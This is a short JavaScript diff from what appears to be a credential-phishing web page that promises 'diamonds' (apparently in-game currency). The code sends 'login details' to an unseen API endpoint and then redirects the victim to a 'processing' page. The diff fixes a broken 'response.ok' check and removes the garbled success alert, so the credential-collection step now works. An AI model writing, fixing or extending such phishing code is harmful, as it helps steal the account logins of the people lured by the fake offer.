@@ -70,8 +70,8 @@
 
             fetch(apiUrl)
                 .then(response => {
-                    if (responsok) {
-                        alrt("DIAMOND REQUAST SEND SUCCESSFULLY PLEASE WAIT 3Hours!");
+                    if (response.ok) {
+                        // Success alert removed
                         window.location.href = "processing.html";
                     } else {
                         alert("Failed to send login details. Please try again.");
